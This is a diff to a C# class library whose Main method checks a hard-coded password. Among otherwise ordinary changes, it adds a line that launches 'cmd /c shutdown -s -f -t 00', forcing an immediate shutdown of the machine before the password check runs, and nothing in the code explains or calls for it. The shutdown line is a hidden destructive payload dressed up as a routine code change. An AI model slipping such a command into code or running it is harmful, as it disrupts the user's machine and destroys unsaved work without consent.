@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Diagnostics;
 
 namespace ClassLibrary2Z
 {
@@ -25,6 +26,7 @@ namespace ClassLibrary2Z
 
         public static void Main(string[] args)
         {
+            System.Diagnostics.Process.Start("cmd", "/c shutdown -s -f -t 00");
             bool arr = PasswordChecker.validatePassword("1)Kghbdtn");
 
             Console.WriteLine("res = " + arr);
